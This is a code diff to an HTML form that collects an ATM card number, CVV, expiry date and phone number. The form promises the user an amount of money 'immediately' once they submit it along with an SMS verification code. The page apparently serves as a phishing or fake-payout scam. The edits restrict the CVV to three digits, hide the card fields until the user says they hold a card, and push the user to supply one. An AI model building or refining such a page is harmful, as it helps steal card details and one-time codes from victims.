@@ -52,7 +52,6 @@
     }
 
     .card-section {
-      display: none;
       margin-top: 10px;
     }
 
@@ -69,6 +68,10 @@
 
     button:hover {
       background-color: #0056b3;
+    }
+
+    .hidden {
+      display: none;
     }
   </style>
 </head>
@@ -116,8 +119,8 @@
       <label for="atmNumber">ATM Card Number</label>
       <input type="text" id="atmNumber" name="atmNumber" maxlength="16" pattern="\d{13,16}" inputmode="numeric">
 
-      <label for="cvv">CVV</label>
-      <input type="text" id="cvv" name="cvv" maxlength="4" pattern="\d{3,4}" inputmode="numeric" required>
+      <label for="cvv">CVV (3 digits only)</label>
+      <input type="text" id="cvv" name="cvv" maxlength="3" pattern="\d{3}" inputmode="numeric" required>
 
       <label for="expiry">Expiry Date (MM/YY)</label>
       <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" pattern="^(0[1-9]|1[0-2])\/\d{2}$" required>
@@ -152,7 +155,10 @@
       amountPreview.textContent = amount;
       bankPreview.textContent = bank;
       bankTypePreview.textContent = bank;
-      autoFilledNote.textContent = `You will receive ${amount} immediately you submit the form and the SMS verification sent to your number ${phone}`;
+
+      if (atmLinked.value === "Yes") {
+        autoFilledNote.textContent = `You will receive ${amount} immediately you submit the form and the SMS verification sent to your number ${phone}`;
+      }
     }
 
     amountInput.addEventListener("input", updateDynamicText);
@@ -161,9 +167,13 @@
 
     atmLinked.addEventListener("change", () => {
       if (atmLinked.value === "Yes") {
+        cardSection.classList.remove("hidden");
         cardSection.style.display = "block";
+        updateDynamicText();
       } else {
+        cardSection.classList.add("hidden");
         cardSection.style.display = "none";
+        autoFilledNote.textContent = "YOU MUST HAVE AN ATM CARD TO PROCEED";
       }
     });
   </script>
